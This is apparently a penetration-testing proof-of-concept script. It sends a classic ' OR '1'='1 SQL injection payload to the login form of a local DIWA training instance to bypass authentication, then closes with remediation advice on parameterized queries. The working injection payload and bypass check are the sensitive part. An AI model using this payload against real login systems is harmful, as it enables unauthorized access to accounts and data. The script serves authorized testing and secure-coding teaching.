#!/usr/bin/env python3
"""
Stage 2 POC: SQL Injection in Login Form
Target: http://127.0.0.1:8080 (local DIWA instance only - authorized testing)
Vulnerability: userSignIn() concatenates email parameter directly into SQL query
"""

import requests
import sys

TARGET = "http://127.0.0.1:8080"
SESSION = requests.Session()

def test_sqli_login_bypass():
    """
    Attempt SQL injection in login form to bypass authentication.
    Payload: ' OR '1'='1 (classic SQL injection)
    Expected: Successful login without valid credentials
    """
    print("[*] Testing SQL Injection in Login Form...")
    
    try:
        # First, get the login page to ensure we're connected
        resp = SESSION.get(f"{TARGET}/?page=login")
        if resp.status_code != 200:
            print("❌ NOT REPRODUCIBLE: Cannot reach login page")
            return False
        
        # Craft SQL injection payload
        payload = {
            'email': "' OR '1'='1",  # SQL injection to bypass WHERE clause
            'password': 'anything'
        }
        
        # Submit login form
        resp = SESSION.post(f"{TARGET}/?page=login", data=payload, allow_redirects=False)
        
        # Check for successful login redirect (Location header) or session cookie
        if 'Location' in resp.headers and 'loggedin' in resp.headers['Location']:
            print("✅ VULNERABLE: SQL Injection bypassed login")
            return True
        
        # Alternative: check session cookie was set
        if 'PHPSESSID' in SESSION.cookies or SESSION.cookies:
            # Try accessing protected page
            resp2 = SESSION.get(f"{TARGET}/?page=board")
            if 'Thread' in resp2.text or 'thread' in resp2.text.lower():
                print("✅ VULNERABLE: SQL Injection bypassed login (session verified)")
                return True
        
        print("❌ NOT REPRODUCIBLE: Injection did not bypass login")
        return False
        
    except Exception as e:
        print(f"❌ NOT REPRODUCIBLE: Error - {e}")
        return False

if __name__ == '__main__':
    result = test_sqli_login_bypass()
    sys.exit(0 if result else 1)

"""
REMEDIATION:
Use prepared statements (parameterized queries) to safely separate SQL code from user data:

  public function userSignIn($pEmail, $pPassword, $pHashingAlgorithm) {
      try {
          $stmt = $this->db->prepare(
              'SELECT * FROM ' . $this->prefix . 'users WHERE email = ? AND password = ?'
          );
          $stmt->execute([$pEmail, hash($pHashingAlgorithm, $pPassword)]);
          return $stmt->fetchAll();
      }
      catch(Exception $ex) {
          error(500, 'Query could not be executed', $ex);
      }
  }

Key points:
- Use ? placeholders for values
- Pass values in execute() array, NOT in query string
- Database driver handles escaping automatically
- Apply to ALL queries that include user input (email, username, etc.)
"""
